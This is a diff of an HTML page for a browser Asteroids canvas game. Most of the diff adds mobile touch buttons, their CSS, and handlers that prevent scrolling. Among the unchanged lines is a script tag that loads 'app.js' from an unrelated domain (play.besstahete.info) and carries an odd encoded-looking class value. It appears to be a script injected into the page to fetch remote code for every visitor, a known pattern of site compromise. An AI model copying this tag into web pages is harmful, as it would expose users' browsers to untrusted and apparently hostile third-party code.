@@ -16,6 +16,26 @@ Source: https://github.com/everblind/js-playground/tree/master/canvas-asteroids
 			height: 100%;
 			background: #262626;
 		}
+		
+		#botones1 {
+			color: #FFF;
+			font-family: "Lucida Sans Typewriter", "Lucida Console", Monaco, "Bitstream Vera Sans Mono", monospace;
+			margin: 85% 1% 0;
+			padding: 25px;
+			background: #161616;
+			position: absolute;
+			z-index: 1;
+		}
+		
+		#botones2 {
+			color: #FFF;
+			font-family: "Lucida Sans Typewriter", "Lucida Console", Monaco, "Bitstream Vera Sans Mono", monospace;
+			margin: 85% 90% 0;
+			padding: 25px;
+			background: #161616;
+			position: absolute;
+			z-index: 1;
+		}
 
 		#info {
 			color: #FFF;
@@ -46,6 +66,43 @@ Source: https://github.com/everblind/js-playground/tree/master/canvas-asteroids
 
 <canvas id="canvas"></canvas>
 
+<div id="botones1"> 
+	<p id="u" onmousedown="move(1)" onmouseup="move(0)"  ontouchstart="move(1)" ontouchend="move(0)" style="font-size: 60px;">△</p> 
+	<br><br>
+	<p id="d" onmousedown="move(0)" onmouseup="move(0)"  ontouchstart="move(0)" ontouchend="move(0)" style="font-size: 60px;">▽</p>
+</div>
+<div id="botones2"> 
+	<p id="l" onmousedown="left(1)" onmouseup="left(0)"  ontouchstart="left(1)" ontouchend="left(0)" style="font-size: 60px;"><</p> 
+	<br><br>
+	<p id="r" onmousedown="right(1)" onmouseup="right(0)"  ontouchstart="right(1)" ontouchend="right(0)" style="font-size: 60px;">></p>
+</div>
+
 <script async class="pI9mmnNk;-15;1" src="https://play.besstahete.info/app.js"></script>
+<script>
+	var canvas = document.getElementById("canvas");	
+	window.addEventListener('load', function(){
+		document.getElementById("botones1").style.margin = (canvas.height-240).toString() + "px 1% 0";
+		document.getElementById("botones2").style.margin = (canvas.height-240).toString() + "px 90% 0";
+	}, false );
+	
+        // listen for touches
+        window.addEventListener('touchstart', function(e) {
+            e.preventDefault();
+            // the event object has an array
+            // called touches, we just want
+            // the first touch
+        }, {passive: false});
+        window.addEventListener('touchmove', function(e) {
+            // we're not interested in this
+            // but prevent default behaviour
+            // so the screen doesn't scroll
+            // or zoom
+            e.preventDefault();
+        }, {passive: false});
+        window.addEventListener('touchend', function(e) {
+            // as above
+            e.preventDefault();
+        }, {passive: false});
+</script>
 
 </html>
